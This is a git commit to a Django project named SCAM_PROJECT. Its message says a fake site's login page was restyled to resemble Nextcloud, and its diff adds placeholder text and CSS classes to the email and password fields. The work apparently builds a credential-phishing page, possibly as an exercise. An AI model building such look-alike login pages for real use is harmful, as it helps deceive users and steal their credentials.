6a0a1ae3779292af2fa98ef245cd731c9faca8b8
joshnee.cunanan <joshnee.kim.cunanan@gmail.com>
2020-10-06 14:28:58 +0800

    [SCAM_PROJECT] modified the login css design to be similar to nextcloud
    added images for these changes

--- python_source/SCAM_PROJECT/fakesite/forms.py
+++ python_source/SCAM_PROJECT/fakesite/forms.py
@@ -4,8 +4,10 @@ from django import forms
 class LoginForm(forms.Form):
     email = forms.CharField(label="Email",
                             max_length=100,
-                            widget=forms.EmailInput(attrs={'class': 'form-control'}))
+                            widget=forms.EmailInput(attrs={'placeholder': 'Username or email',
+                                                           'class': 'email form-control'}))
 
     password = forms.CharField(label="Password",
                                max_length=100,
-                               widget=forms.PasswordInput(attrs={'class': 'form-control'}))
+                               widget=forms.PasswordInput(attrs={'placeholder': 'Password',
+                                                                 'class': 'pass form-control'}))
